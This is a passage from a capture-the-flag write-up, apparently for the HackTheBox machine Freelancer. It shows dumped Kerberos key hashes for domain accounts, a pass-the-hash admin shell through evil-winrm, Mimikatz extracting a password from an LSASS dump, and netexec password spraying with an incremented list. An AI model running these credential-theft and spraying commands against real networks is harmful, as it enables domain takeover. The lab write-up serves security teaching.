sshd:aes256-cts-hmac-sha1-96:a8782de0299ca5fe9658b4813aa47b80097f54c76e1311e160947bdb0b366660
sshd:aes128-cts-hmac-sha1-96:f00346995373fef1641c6e5b90b74424
sshd:des-cbc-md5:01a2976764688a73
SQLBackupOperator:aes256-cts-hmac-sha1-96:054901226a3869da55b25ed0c8c1d9fba0130f7bec9441f51e6d58e5aa645d74
SQLBackupOperator:aes128-cts-hmac-sha1-96:c7e1a5cb1ae6fe0cb333075ccceb7215
SQLBackupOperator:des-cbc-md5:549eda3480ceab92
sql_svc:aes256-cts-hmac-sha1-96:91c836ba7777d253101c7052c78016ba11b25696fe1e0afbabcc2745c8c23dd5
sql_svc:aes128-cts-hmac-sha1-96:c08735502e4220b00a8555282f207bb8
sql_svc:des-cbc-md5:aea8fddc4a2a0162
DATACENTER-2019$:aes256-cts-hmac-sha1-96:87ed12bf74dbd8e3cf0f12e7c5de9537dcc35ed889950d14b0f9e753545a808c
DATACENTER-2019$:aes128-cts-hmac-sha1-96:aa9becc6a8437c4f4b4ca56a9230634a
DATACENTER-2019$:des-cbc-md5:615d43ce97e61370
lorra199:aes256-cts-hmac-sha1-96:4411e57eea44e7064c4aa478a42dbbee00e503de94be38a024b92a12c712f646
lorra199:aes128-cts-hmac-sha1-96:cbd6cbc21ef3685c96e57ce0dee0ea37
lorra199:des-cbc-md5:7c6de98967578cce
freelancer.htb\maya.artmes:aes256-cts-hmac-sha1-96:87dbbb7747315d238fbc8cf2b491fb2440ec5df911fef4c960d5f6a3d8880417
freelancer.htb\maya.artmes:aes128-cts-hmac-sha1-96:b471a81c44f36cbae619f40716c7c8bd
freelancer.htb\maya.artmes:des-cbc-md5:011623c2e0ce4c1a
freelancer.htb\michael.williams:aes256-cts-hmac-sha1-96:6d6c00a78f43971ce12cced2a0e9eba91b1e17deb2826b55263bff1d87b439fc
freelancer.htb\michael.williams:aes128-cts-hmac-sha1-96:74042a3a68bc861289f672e0d27fe6b6
freelancer.htb\michael.williams:des-cbc-md5:83837cc7617f52a4
freelancer.htb\sdavis:aes256-cts-hmac-sha1-96:be5c22288453e08f76be3f11d7e4c9cda128be135537895aa8d68fb01c1be9e0
freelancer.htb\sdavis:aes128-cts-hmac-sha1-96:d05709ee072d825c3f323be21475a7ea
freelancer.htb\sdavis:des-cbc-md5:bccb52aedf98fb1f
freelancer.htb\d.jones:aes256-cts-hmac-sha1-96:bab008e4e24beafd524f0081cf15b0eafea3585f963fa6947f701eb6f820ca33
freelancer.htb\d.jones:aes128-cts-hmac-sha1-96:0ebb687442c5c2c515ad00205fab2a6f
freelancer.htb\d.jones:des-cbc-md5:1cd3da20bae3c198
freelancer.htb\jen.brown:aes256-cts-hmac-sha1-96:0298d308060494d06232656f455829ab27f24789520d1cc66f89ee97d3174d0d
freelancer.htb\jen.brown:aes128-cts-hmac-sha1-96:1894401fd91b66ff2d6d63fcfe662313
freelancer.htb\jen.brown:des-cbc-md5:342ce9a42ace8092
freelancer.htb\taylor:aes256-cts-hmac-sha1-96:cbf730581c4cbb76462a9b0e5517da7b70e13d5103cc68e3483b2c093f0b5d7c
freelancer.htb\taylor:aes128-cts-hmac-sha1-96:d444dcd43270907c762b4869dc47bd47
freelancer.htb\taylor:des-cbc-md5:1f6edf615725c80e
freelancer.htb\jmartinez:aes256-cts-hmac-sha1-96:83ec85539004c5aa3fb840eab3249a2700fb5cee564e6b0b40c0009670744660
freelancer.htb\jmartinez:aes128-cts-hmac-sha1-96:89b817a7ed0f6e7ac6e41df723cdb1c2
freelancer.htb\jmartinez:des-cbc-md5:6bfde3ea0d04c1b0
freelancer.htb\olivia.garcia:aes256-cts-hmac-sha1-96:3ca56134c8c738873fdcb19fafea3c8b39d5eaaab005a4e1b24a9bcdec0761d0
freelancer.htb\olivia.garcia:aes128-cts-hmac-sha1-96:e31085216515ef081b92cc4ab827765c
freelancer.htb\olivia.garcia:des-cbc-md5:3bdaa40d31b345f4
freelancer.htb\dthomas:aes256-cts-hmac-sha1-96:6a73a933a0b4007798a65127b8917922bb3e1b2d5d3acc1dfd904cb86bf05842
freelancer.htb\dthomas:aes128-cts-hmac-sha1-96:d527381366a92d8ceb759f9aa21326e8
freelancer.htb\dthomas:des-cbc-md5:abbffb891f153883
freelancer.htb\sophia.h:aes256-cts-hmac-sha1-96:77d45db16e39bd96386975610299c7f2c675ec32d8a92cd340357b7656b9e78b
freelancer.htb\sophia.h:aes128-cts-hmac-sha1-96:7ad896f3839a23370dc2158d15ed23bb
freelancer.htb\sophia.h:des-cbc-md5:7c1cb0d654517a57
freelancer.htb\Ethan.l:aes256-cts-hmac-sha1-96:4a19d9711f7e182d14bde755de201c3b387ec800e5d8a4b65c304c702cd931ac
freelancer.htb\Ethan.l:aes128-cts-hmac-sha1-96:5d281646333e0f988591f4d9f5839acf
freelancer.htb\Ethan.l:des-cbc-md5:451abc9b4cc1cb61
freelancer.htb\wwalker:aes256-cts-hmac-sha1-96:9566d111248ca62a7fd615ec0ecf17110cb5ce8d4db6ae70f155003d843e35ee
freelancer.htb\wwalker:aes128-cts-hmac-sha1-96:cd5ff86e6729e674745be70c08b0699f
freelancer.htb\wwalker:des-cbc-md5:c131709d8f7f61a8
freelancer.htb\jgreen:aes256-cts-hmac-sha1-96:b6f58646adf12516edf197ce30dcda3e4c0966f2868183a2c02bba7e2241b162
freelancer.htb\jgreen:aes128-cts-hmac-sha1-96:2b321949c61ad2e75918e2bf7efd4724
freelancer.htb\jgreen:des-cbc-md5:405b6208ecc82057
freelancer.htb\evelyn.adams:aes256-cts-hmac-sha1-96:96a7f8556b8a2fad3f13184735b5e4657a6baf98b0f28036ab546562917eff36
freelancer.htb\evelyn.adams:aes128-cts-hmac-sha1-96:ed59b48e2d08731cc6ee7ebd791ab415
freelancer.htb\evelyn.adams:des-cbc-md5:526bda25ef3204f7
freelancer.htb\hking:aes256-cts-hmac-sha1-96:877b3ae2722aced00d78b66a0aad4ddbcc37fd8c1179d1d43a7478569a655771
freelancer.htb\hking:aes128-cts-hmac-sha1-96:2030e3efff50f998a9616aef40ea3578
freelancer.htb\hking:des-cbc-md5:869238df6868d913
freelancer.htb\alex.hill:aes256-cts-hmac-sha1-96:eeed403dc3fe63e53c6b6230f9a8980a21ee3b85e70a428d136e1632503e0d60
freelancer.htb\alex.hill:aes128-cts-hmac-sha1-96:1cc28dac35933ca7c1f5aadf7ba27a26
freelancer.htb\alex.hill:des-cbc-md5:e9abe0493eda04fb
freelancer.htb\samuel.turner:aes256-cts-hmac-sha1-96:6a1f51c13337648de96112140c42cd64e2d13a0dc74c52f668f788ad90163df2
freelancer.htb\samuel.turner:aes128-cts-hmac-sha1-96:8c8efb5dbdc3498008a039a5259c770d
freelancer.htb\samuel.turner:des-cbc-md5:341f804a94e0fde3
freelancer.htb\ereed:aes256-cts-hmac-sha1-96:db3028570853a4578221624c3eb479a3e394f51d8ec60382bda68f9f80e85529
freelancer.htb\ereed:aes128-cts-hmac-sha1-96:4974b1cbb5220fa123a5bd41aabb7bca
freelancer.htb\ereed:des-cbc-md5:cbbc0efdc8c1df45
freelancer.htb\leon.sk:aes256-cts-hmac-sha1-96:4deaf484fd929e838817743617af0853e39e4343d6c0955b1939fe4468fd7264
freelancer.htb\leon.sk:aes128-cts-hmac-sha1-96:2e026c6c4a8b2efc2211416adde3b9c7
freelancer.htb\leon.sk:des-cbc-md5:31c71a9438a1da38
DATAC2-2022$:aes256-cts-hmac-sha1-96:b5d0c7873946a3910780851a0922034facec03a4a083700b8724ccb0ba99bdce
DATAC2-2022$:aes128-cts-hmac-sha1-96:163fdfc01621c567a9bb041bbda1bb3e
DATAC2-2022$:des-cbc-md5:078376a249862f32
WS1-WIIN10$:aes256-cts-hmac-sha1-96:509bc5affbf4f45619b1fe8e9e236f14286e2a1fc9435b84747a8e8e440e2dec
WS1-WIIN10$:aes128-cts-hmac-sha1-96:01a1553fd3358136c6b5421bcb1b7f89
WS1-WIIN10$:des-cbc-md5:a19b2a8976ce0b9e
WS2-WIN11$:aes256-cts-hmac-sha1-96:7848ba3e99fab92b8308556b7520ce578d055441a1f6d63b54fb170f7ee4f960
WS2-WIN11$:aes128-cts-hmac-sha1-96:60f5f618548447a64bbe1b9cad7c2776
WS2-WIN11$:des-cbc-md5:d60825d9bcc14340
WS3-WIN11$:aes256-cts-hmac-sha1-96:8b6f4c958a3de942761e09175683dedbbd034d52d8128ce2a96db1fb44611301
WS3-WIN11$:aes128-cts-hmac-sha1-96:e62e2a9cbb2832548c0d52dc05ff3ba1
WS3-WIN11$:des-cbc-md5:387f80ce91f792a2
DC2$:aes256-cts-hmac-sha1-96:ff2dedd696532b956c6cdd47f09ecd175b9c6a167827b75cd4fa2e5312570848
DC2$:aes128-cts-hmac-sha1-96:5e3c61366b67de3cfe990ca87962bc1b
DC2$:des-cbc-md5:f170198c9d4c2a29
freelancer.htb\carol.poland:aes256-cts-hmac-sha1-96:a230f87fafce155b3b02cabbba74c83e7b8ddb4f74a4e6605a06bc980267289b
freelancer.htb\carol.poland:aes128-cts-hmac-sha1-96:1b383dd738a8768c465e48c46e0dfcbb
freelancer.htb\carol.poland:des-cbc-md5:041652e5cd97ea6e
freelancer.htb\lkazanof:aes256-cts-hmac-sha1-96:4ba98049d411ea7293b5924a25c10ae2a3c18f045aa22fb7c828d888820fd719
freelancer.htb\lkazanof:aes128-cts-hmac-sha1-96:b8fd8c1c1d3dde5c21cf3f482989a718
freelancer.htb\lkazanof:des-cbc-md5:57f2d5b515020d70
freelancer.com\liza.kazanof:aes256-cts-hmac-sha1-96:d1d7dadd2fd12b6d08264c0c94d029746871eb6665863a084f60d922d0653b6a
freelancer.com\liza.kazanof:aes128-cts-hmac-sha1-96:11f98cec8eeec7b3763c11c43a3a0f12
freelancer.com\liza.kazanof:des-cbc-md5:3eea76a116676d68
SETUPMACHINE$:aes256-cts-hmac-sha1-96:b88fcc7fe204621b2b3b911a1db4c458fafe7ac3ef57302962461b9ce3db243a
SETUPMACHINE$:aes128-cts-hmac-sha1-96:118aa6b399016d4eed23e3bc680616f7
SETUPMACHINE$:des-cbc-md5:b3e56483b052c2ab
[*] Cleaning up...

```

And get a shell as administrator:

```

oxdf@hacky$ evil-winrm -i freelancer.htb -u administrator -H 0039318f1e8274633445bce32ad1a290
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>

```

### Alternative Password Spray

#### Recover Password

A dump file like `MEMORY.DMP` can be loaded into [WinDbg](http://www.windbg.org/):

![image-20240930182029620](/img/image-20240930182029620.png)

What’s especially cool is that [Mimikatz](https://github.com/gentilkiwi/mimikatz) is made to be loaded here. I’ll load the `mimilib.dll` file that comes with Mimikatz with `.load C:\Tools\Mimikatz\x64\mimilib.dll`:

![image-20240930182201667](/img/image-20240930182201667.png)

Next I want to be in the `lsass.exe` process. `!process 0 0 lsass.exe` will give information about the process, including it’s location in memory:

![image-20240930182313473](/img/image-20240930182313473.png)

Now I’ll switch to the `lsass.exe` context with `.process /r /p ffffbc83a93e7080`. If it throws an error about Symbols, that is likely ok. I can try to reload them, but I’ll move on for now.

`!mimikatz` will run it on the current process:

![image-20240930182534435](/img/image-20240930182534435.png)

A ways down, there’s a plaintext password, “v3ryS0l!dP@sswd#29”:

![image-20240930182628393](/img/image-20240930182628393.png)

#### Spray Password - Failure

I’ll try spraying this password against all the users in the domain. I’ve already got enough access to get a full list of users on the domain:

```

oxdf@hacky$ netexec smb freelancer.htb -u mikasaAckerman -p IL0v3ErenY3ager --users
SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.5      445    DC               [+] freelancer.htb\mikasaAckerman:IL0v3ErenY3ager
SMB         10.10.11.5      445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.10.11.5      445    DC               Administrator                 2024-05-27 17:59:50 5       Built-in account for administering the computer/domain
SMB         10.10.11.5      445    DC               Guest                         <never>             6       Built-in account for guest access to the computer/domain
SMB         10.10.11.5      445    DC               krbtgt                        2023-08-24 01:47:22 6       Key Distribution Center Service Account
SMB         10.10.11.5      445    DC               mikasaAckerman                2024-05-27 17:58:13 0       Database Developer
SMB         10.10.11.5      445    DC               sshd                          2023-08-28 18:30:29 6
SMB         10.10.11.5      445    DC               SQLBackupOperator             2023-09-21 07:26:05 6       SQL Backup Operator Account for Temp Schudeled SQL Express Backups
SMB         10.10.11.5      445    DC               sql_svc                       2023-11-02 19:10:09 6       MSSQL Database Domain Account
SMB         10.10.11.5      445    DC               lorra199                      2023-10-04 12:19:13 8       IT Support Technician
SMB         10.10.11.5      445    DC               maya.artmes                   2023-10-12 01:15:22 6       System Analyzer
SMB         10.10.11.5      445    DC               michael.williams              2023-10-12 01:40:29 6       Department Manager
SMB         10.10.11.5      445    DC               sdavis                        2023-10-12 01:44:58 6       IT Support
SMB         10.10.11.5      445    DC               d.jones                       2023-10-12 01:49:15 6       Software Developer
SMB         10.10.11.5      445    DC               jen.brown                     2023-10-12 01:51:04 6       Software Developer
SMB         10.10.11.5      445    DC               taylor                        2023-10-12 01:52:40 7       Human Resources Specialist
SMB         10.10.11.5      445    DC               jmartinez                     2023-10-12 01:57:32 7       Executive Manager
SMB         10.10.11.5      445    DC               olivia.garcia                 2023-10-12 02:19:04 7       WSGI Manager
SMB         10.10.11.5      445    DC               dthomas                       2023-10-12 02:45:32 7       System Analyzer
SMB         10.10.11.5      445    DC               sophia.h                      2023-10-12 03:02:17 8       Datacenter Manager
SMB         10.10.11.5      445    DC               Ethan.l                       2023-10-12 03:11:23 7       DJango Developer
SMB         10.10.11.5      445    DC               wwalker                       2023-10-12 03:20:06 7       Active Directory Trusts Manager
SMB         10.10.11.5      445    DC               jgreen                        2023-10-12 03:25:04 8       Active Directory Accounts Operator
SMB         10.10.11.5      445    DC               evelyn.adams                  2023-10-12 03:27:06 8       Active Directory Accounts Operator
SMB         10.10.11.5      445    DC               hking                         2023-10-12 03:35:58 8
SMB         10.10.11.5      445    DC               alex.hill                     2023-10-12 03:40:27 8       DJango Developer
SMB         10.10.11.5      445    DC               samuel.turner                 2023-10-12 03:43:51 8
SMB         10.10.11.5      445    DC               ereed                         2023-10-12 04:04:24 8       Site Reliability Engineer (SRE)
SMB         10.10.11.5      445    DC               leon.sk                       2023-11-02 05:20:04 8       Site Reliability Engineer (SRE)
SMB         10.10.11.5      445    DC               carol.poland                  2023-11-02 06:20:51 8       IT Technician
SMB         10.10.11.5      445    DC               lkazanof                      2023-10-19 23:39:28 9       System Reliability Monitor (SRM) & Account Operator
SMB         10.10.11.5      445    DC               [*] Enumerated 29 local users: FREELANCER

```

I’ll make a list and spray them:

```

oxdf@hacky$ netexec smb freelancer.htb -u all_domain_users -p 'v3ryS0l!dP@sswd#29' --continue-on-success
SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.5      445    DC               [-] freelancer.htb\Administrator:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\Guest:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\krbtgt:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\mikasaAckerman:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\sshd:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\SQLBackupOperator:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\sql_svc:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\lorra199:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\maya.artmes:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\michael.williams:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\sdavis:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\d.jones:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\jen.brown:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\taylor:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\jmartinez:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\olivia.garcia:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\dthomas:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\sophia.h:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\Ethan.l:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\wwalker:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\jgreen:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\evelyn.adams:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\hking:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\alex.hill:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\samuel.turner:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\ereed:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\leon.sk:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\carol.poland:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\lkazanof:v3ryS0l!dP@sswd#29 STATUS_LOGON_FAILURE

```

Nothing.

#### Expand Password

The number at the end looks like something that could be incremented. I’ll generate a list of passwords of the same structure with different numbers:

```

oxdf@hacky$ seq 10 60 | while read num; do echo 'v3ryS0l!dP@sswd#'"$num"; done > very_solid_inc

```

This spray takes a long time, but it does find a bunch of users (using `grep` to show only successful attempts):

```

oxdf@hacky$ netexec smb freelancer.htb -u all_domain_users -p very_solid_inc --continue-on-success | grep -v '[-]'
SMB                      10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
SMB                      10.10.11.5      445    DC               [+] freelancer.htb\maya.artmes:v3ryS0l!dP@sswd#31 
SMB                      10.10.11.5      445    DC               [+] freelancer.htb\SQLBackupOperator:v3ryS0l!dP@sswd#33 
SMB                      10.10.11.5      445    DC               [+] freelancer.htb\sql_svc:v3ryS0l!dP@sswd#34 
SMB                      10.10.11.5      445    DC               [+] freelancer.htb\michael.williams:v3ryS0l!dP@sswd#34 
SMB                      10.10.11.5      445    DC               [+] freelancer.htb\leon.sk:v3ryS0l!dP@sswd#34 
SMB                      10.10.11.5      445    DC               [+] freelancer.htb\carol.poland:v3ryS0l!dP@sswd#34 
SMB                      10.10.11.5      445    DC               [+] freelancer.htb\sdavis:v3ryS0l!dP@sswd#35 
SMB                      10.10.11.5      445    DC               [+] freelancer.htb\d.jones:v3ryS0l!dP@sswd#35 
SMB                      10.10.11.5      445    DC               [+] freelancer.htb\jen.brown:v3ryS0l!dP@sswd#35 
SMB                      10.10.11.5      445    DC               [+] freelancer.htb\taylor:v3ryS0l!dP@sswd#35 
SMB                      10.10.11.5      445    DC               [+] freelancer.htb\jmartinez:v3ryS0l!dP@sswd#35 
SMB                      10.10.11.5      445    DC               [+] freelancer.htb\olivia.garcia:v3ryS0l!dP@sswd#35 
SMB                      10.10.11.5      445    DC               [+] freelancer.htb\dthomas:v3ryS0l!dP@sswd#35 
SMB                      10.10.11.5      445    DC               [+] freelancer.htb\sophia.h:v3ryS0l!dP@sswd#35 
SMB                      10.10.11.5      445    DC               [+] freelancer.htb\Ethan.l:v3ryS0l!dP@sswd#35 
SMB                      10.10.11.5      445    DC               [+] freelancer.htb\wwalker:v3ryS0l!dP@sswd#35 
SMB                      10.10.11.5      445    DC               [+] freelancer.htb\jgreen:v3ryS0l!dP@sswd#35 
SMB                      10.10.11.5      445    DC               [+] freelancer.htb\evelyn.adams:v3ryS0l!dP@sswd#35 
SMB                      10.10.11.5      445    DC               [+] freelancer.htb\hking:v3ryS0l!dP@sswd#35 
SMB                      10.10.11.5      445    DC               [+] freelancer.htb\alex.hill:v3ryS0l!dP@sswd#35 
SMB                      10.10.11.5      445    DC               [+] freelancer.htb\samuel.turner:v3ryS0l!dP@sswd#35 
SMB                      10.10.11.5      445    DC               [+] freelancer.htb\ereed:v3ryS0l!dP@sswd#35 

```

#### Identify Account Operators

There are four users in the Account Operators group:

```
*Evil-WinRM* PS C:\> net localgroup "Account Operators"
Alias name     Account Operators
Comment        Members can administer domain user and group accounts

Members
-------------------------------------------------------------------------------
evelyn.adams
jgreen
jmartinez
lkazanof
The command completed successfully.

```

The first three are in the group that I now have passwords for. These provide a path to admin. For example, jgreen:

![image-20240930190001295](/img/image-20240930190001295.png)

As a member of Account Operators, jgreen is in AD Recycle Bin, which has `GenericWrite` over `dc.freelancer.htb`. With that privilege, I can use the same path [as above](#exploit-via-rbcd).